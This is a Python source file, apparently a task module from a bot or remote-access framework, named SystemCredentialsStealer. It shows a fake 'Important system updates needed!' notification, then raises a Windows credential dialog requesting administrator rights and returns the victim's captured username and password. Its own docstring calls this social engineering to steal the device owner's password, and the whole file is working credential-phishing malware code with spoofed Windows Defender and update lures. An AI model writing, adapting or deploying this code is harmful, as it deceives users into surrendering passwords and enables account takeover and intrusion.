from tasks.__task import Task
from tasks.notifier import Notifier

NOTIFICATIONS = {"update": {"title": "Important system updates needed!",
                            "description": "Your system version is outdated and this PC won't "
                                           "receive any critical security updates. "
                                           "Enter password to download and install update."},

                 "antivirus": {"title": "Update virus protection",
                               "description": "Virus protection is out of date. "
                                              "Enter password to update Windows Defender Antivirus."}}


class MethodCredUI:
    platforms = ["win32"]
    administrator = {"win32": False}

    def __init__(self):
        super(MethodCredUI, self).__init__()

    def run(self):
        import os
        from win32cred import (CredUIPromptForCredentials, CREDUI_FLAGS_DO_NOT_PERSIST,
                               CREDUI_FLAGS_REQUEST_ADMINISTRATOR, CREDUI_FLAGS_VALIDATE_USERNAME,
                               CREDUI_FLAGS_INCORRECT_PASSWORD)

        flags = (CREDUI_FLAGS_REQUEST_ADMINISTRATOR
                 | CREDUI_FLAGS_VALIDATE_USERNAME
                 | CREDUI_FLAGS_INCORRECT_PASSWORD
                 | CREDUI_FLAGS_DO_NOT_PERSIST)
        creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True,
                                           flags, {})
        return "User credentials: {}".format(creds)


class SystemCredentialsStealer(Task):
    """Uses social engineering to steal device owner password."""
    platforms = ["win32"]
    description = __doc__
    administrator = {"win32": False}
    kwargs = {"create_notification": {"type": bool, "description": "Create notification.", "default": True},
              "translate_notification": {"type": bool, "description": "Translate notification.", "default": True}}
    packages = ["pywin32"]

    def __init__(self, task_id):
        super(SystemCredentialsStealer, self).__init__(task_id)
        import logging
        self._logger = logging.getLogger(self.__class__.__name__)
        self.methods = [MethodCredUI]

    def run(self, **kwargs):
        create_notification = kwargs.get("create_notification")
        translate_notification = kwargs.get("translate_notification")

        from time import sleep
        from infos import administrator, platform

        failed = []
        admin = administrator()
        platform = platform()

        if create_notification:
            title = "Important system updates needed!"
            description = "Your system version is outdated and " \
                          "this PC won't receive any critical security updates. " \
                          "Log in to download and install update."
            duration = 60
            notifier = Notifier(0).start(title=title, description=description,
                                         duration=duration, translate=translate_notification)
            notifier.run()
            sleep(1)

        for method in self.methods:
            if any(x.startswith(platform) for x in method.platforms):
                if not admin and method.administrator.get(platform):
                    continue
                try:
                    return method().run()
                except Exception as e:
                    failed.append("Method {} failed: {}".format(method.__name__, e))
        if failed:
            raise Exception("Could not create credentials dialog. All methods failed: {}".format(failed))
        else:
            raise Exception("No available method for this bot. platform: {}, admin rights: {}".format(platform, admin))
